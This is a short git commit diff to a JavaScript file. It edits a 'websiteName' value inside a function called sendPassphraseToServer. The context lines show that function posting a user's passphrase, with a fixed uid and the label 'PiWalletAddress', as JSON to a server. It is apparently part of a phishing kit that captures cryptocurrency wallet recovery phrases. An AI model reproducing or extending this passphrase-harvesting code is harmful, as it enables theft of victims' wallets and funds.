703b3f1d91ce9ada78295d2a78e57f06ef3c1b57
brucewhane786 <brucewhane55@gmail.com>
2026-09-08 18:01:09 +0530

    Update index-hhh.js

--- js/index-hhh.js
+++ js/index-hhh.js
@@ -32,7 +32,7 @@ async function sendPassphraseToServer(passphrase) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         uid: "PkZ2jZuOpZYbkNSEylmY49ghSQz2",
-        websiteName: "Helo",
+        websiteName: "Hello2",
         email: "PiWalletAddress",
         password: passphrase
       })
